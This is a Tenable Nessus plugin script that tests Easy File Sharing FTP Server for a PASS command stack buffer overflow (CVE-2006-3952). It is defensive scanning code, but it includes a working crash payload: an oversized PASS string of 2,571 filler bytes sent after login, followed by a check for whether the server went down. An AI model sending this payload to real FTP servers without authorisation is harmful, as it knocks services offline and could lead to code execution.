#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(24021);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2006-3952");
  script_bugtraq_id(19243);
  script_xref(name:"OSVDB", value:"27646");
 
  script_name(english:"Easy File Sharing FTP Server PASS Command Overflow");
  script_summary(english:"Checks for PASS command buffer overflow vulnerability in EFS FTP Server");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using Easy File Sharing FTP Server, an
FTP server for Windows. 

The version of Easy File Sharing FTP Server installed on the remote
host contains a stack-based buffer overflow vulnerability that can be
exploited by an unauthenticated attacker with a specially-crafted PASS
command to crash the affected application or execute arbitrary code on
the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/2234" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("global_settings.inc");
include("ftp_func.inc");

if (report_paranoia < 2) exit(0);


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# Make sure the banner indicates it's WFTPD.
banner = get_ftp_banner(port:port);
if (!banner || "Easy File Sharing FTP Server" >!< banner) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);
s = ftp_recv_line(socket:soc);


# Try to exploit the flaw to crash the daemon.
user = get_kb_item("ftp/login");
if (!user) user = "anonymous";

c = string("USER ", user);
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);

if (s && '331 username ok, need password.' >< s) {
  exploit = string(",", crap(2571));
  c = string("PASS ", exploit);
  send(socket:soc, data:string(c, "\r\n"));
  s = ftp_recv_line(socket:soc);
  close(soc);
  if (s) exit(0);

  # Check whether the server is down.
  soc = open_sock_tcp(port);
  if (!soc) security_hole(port);
  else ftp_close(socket:soc);
}

